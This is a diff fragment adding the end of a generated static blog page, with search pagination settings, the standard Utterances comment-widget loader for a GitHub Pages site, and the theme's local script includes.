+        previous: '<i class="fa fa-angle-left"></i>',
+        next: '<i class="fa fa-angle-right"></i>'
+      },
+      cssClasses: {
+        root: 'pagination',
+        item: 'pagination-item',
+        link: 'page-number',
+        active: 'current',
+        disabled: 'disabled-item'
+      }
+    })
+  );
+
+  search.start();
+});</script><script>function loadUtterances() {
+  var d = document, s = d.createElement('script');
+  var container = d.getElementById('utterances-container');
+
+  if (!container) {
+    return;
+  }
+  s.src = 'https://utteranc.es/client.js';
+  s.setAttribute('repo', 'ixxzhi/ixxzhi.github.io');
+  s.setAttribute('issue-term', 'title');
+  s.setAttribute('label', 'utterances');
+  s.setAttribute('theme', 'github-light');
+  s.setAttribute('crossorigin', 'anonymous');
+  s.setAttribute('async', '');
+  if (false) {
+    s.setAttribute('data-pjax-rm', '');
+  }
+  container.append(s);
+}
+
+if (false) {
+  loadUtterances();
+} else {
+  window.addEventListener('DOMContentLoaded', loadUtterances, false);
+}</script><script src="/js/utils.js?v=2.8.0"></script><script src="/js/stun-boot.js?v=2.8.0"></script><script src="/js/scroll.js?v=2.8.0"></script><script src="/js/header.js?v=2.8.0"></script><script src="/js/sidebar.js?v=2.8.0"></script></body></html>
